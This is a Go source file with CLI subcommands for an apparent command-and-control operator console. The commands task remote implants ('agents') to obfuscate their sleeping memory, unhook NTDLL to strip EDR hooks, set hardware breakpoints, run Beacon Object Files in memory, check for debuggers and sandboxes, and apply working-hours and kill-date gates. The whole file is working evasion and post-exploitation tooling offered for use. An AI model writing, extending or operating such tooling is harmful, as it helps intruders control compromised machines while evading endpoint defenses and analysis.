package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"

	"github.com/spf13/cobra"
)

func evasionPost(agentID, endpoint string, payload interface{}, desc string, wait bool, timeout int) {
	raw, _ := json.Marshal(payload)
	body, err := makeAPIRequestWithMethod("POST",
		"/api/v1/agent/"+agentID+"/"+endpoint,
		bytes.NewBuffer(raw), "application/json")
	if err != nil {
		printError(fmt.Sprintf("%s failed: %v", desc, err))
		os.Exit(1)
	}
	var resp APIResponse
	if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
		msg := resp.Error
		if msg == "" {
			msg = "unknown error"
		}
		printError(fmt.Sprintf("%s failed: %s", desc, msg))
		os.Exit(1)
	}
	dataMap, _ := resp.Data.(map[string]interface{})
	cmdID, _ := dataMap["command_id"].(string)
	printSuccess(fmt.Sprintf("%s queued (cmd %s)", desc, cmdID))
	if wait && cmdID != "" {
		printInfo(fmt.Sprintf("Waiting for result (timeout %ds)...", timeout))
		if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
			displayFinalCommandStatus(finalData, cmdID)
		}
	} else if cmdID != "" {
		printInfo(fmt.Sprintf("command_id: %s", cmdID))
	}
}

// ─── evasion parent ──────────────────────────────────────────────────────────

var evasionCmd = &cobra.Command{
	Use:   "evasion",
	Short: "Evasion — sleep obfuscation, NTDLL unhooking, hardware breakpoints",
}

// ─── evasion sleep ───────────────────────────────────────────────────────────

var evasionSleepCmd = &cobra.Command{
	Use:   "sleep <agent-id>",
	Short: "Obfuscated sleep (XOR memory region during beacon idle)",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		dur, _ := cmd.Flags().GetInt("duration")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")
		evasionPost(agentID, "evasion/sleep", map[string]interface{}{"duration": dur},
			fmt.Sprintf("Obfuscated sleep (%ds)", dur), wait, timeout)
	},
}

// ─── evasion unhook ──────────────────────────────────────────────────────────

var evasionUnhookCmd = &cobra.Command{
	Use:   "unhook <agent-id>",
	Short: "Restore NTDLL .text from disk (remove EDR hooks)",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")
		evasionPost(agentID, "evasion/unhook", map[string]interface{}{}, "NTDLL unhook", wait, timeout)
	},
}

// ─── evasion hwbp ────────────────────────────────────────────────────────────

var evasionHWBPCmd = &cobra.Command{
	Use:   "hwbp",
	Short: "Hardware breakpoint management (DR0-DR3)",
}

var evasionHWBPSetCmd = &cobra.Command{
	Use:   "set <agent-id>",
	Short: "Install hardware execute-breakpoint at address",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		addr, _ := cmd.Flags().GetString("addr")
		reg, _ := cmd.Flags().GetUint8("register")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")
		if addr == "" {
			printError("--addr is required (hex, e.g. 0x7FFE1234)")
			os.Exit(1)
		}
		evasionPost(agentID, "evasion/hwbp/set",
			map[string]interface{}{"addr": addr, "register": reg},
			fmt.Sprintf("HWBP set (addr=%s DR%d)", addr, reg), wait, timeout)
	},
}

var evasionHWBPClearCmd = &cobra.Command{
	Use:   "clear <agent-id>",
	Short: "Remove hardware breakpoint from DR register",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		reg, _ := cmd.Flags().GetUint8("register")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")
		evasionPost(agentID, "evasion/hwbp/clear",
			map[string]interface{}{"register": reg},
			fmt.Sprintf("HWBP clear (DR%d)", reg), wait, timeout)
	},
}

// ─── bof ─────────────────────────────────────────────────────────────────────

var bofCmd = &cobra.Command{
	Use:   "bof <agent-id> <coff.o>",
	Short: "Execute a Beacon Object File (COFF) in-memory on the agent",
	Args:  cobra.ExactArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		coffPath := args[1]
		argsFile, _ := cmd.Flags().GetString("args-file")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")

		coffData, err := os.ReadFile(coffPath)
		if err != nil {
			printError(fmt.Sprintf("read COFF: %v", err))
			os.Exit(1)
		}

		payload := map[string]interface{}{
			"bof_b64": base64.StdEncoding.EncodeToString(coffData),
		}
		if argsFile != "" {
			argsData, err := os.ReadFile(argsFile)
			if err != nil {
				printError(fmt.Sprintf("read args file: %v", err))
				os.Exit(1)
			}
			payload["args_b64"] = base64.StdEncoding.EncodeToString(argsData)
		}
		evasionPost(agentID, "bof", payload,
			fmt.Sprintf("BOF exec (%d bytes)", len(coffData)), wait, timeout)
	},
}

// ─── opsec ───────────────────────────────────────────────────────────────────

var opsecCmd = &cobra.Command{
	Use:   "opsec",
	Short: "OPSEC checks and time-gate configuration",
}

var opsecAntiDebugCmd = &cobra.Command{
	Use:   "antidebug <agent-id>",
	Short: "Check for debugger presence on the agent",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")
		evasionPost(agentID, "opsec/antidebug", map[string]interface{}{}, "Anti-debug check", wait, timeout)
	},
}

var opsecAntiVMCmd = &cobra.Command{
	Use:   "antivm <agent-id>",
	Short: "Check for VM/sandbox artifacts on the agent",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")
		evasionPost(agentID, "opsec/antivm", map[string]interface{}{}, "Anti-VM check", wait, timeout)
	},
}

var opsecTimegateCmd = &cobra.Command{
	Use:   "timegate <agent-id>",
	Short: "Set working-hours window and kill date on the agent",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		start, _ := cmd.Flags().GetInt("work-start")
		end, _ := cmd.Flags().GetInt("work-end")
		kill, _ := cmd.Flags().GetString("kill-date")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")
		evasionPost(agentID, "opsec/timegate",
			map[string]interface{}{"work_start": start, "work_end": end, "kill_date": kill},
			fmt.Sprintf("Time gate (hours %02d-%02d, kill=%s)", start, end, kill), wait, timeout)
	},
}
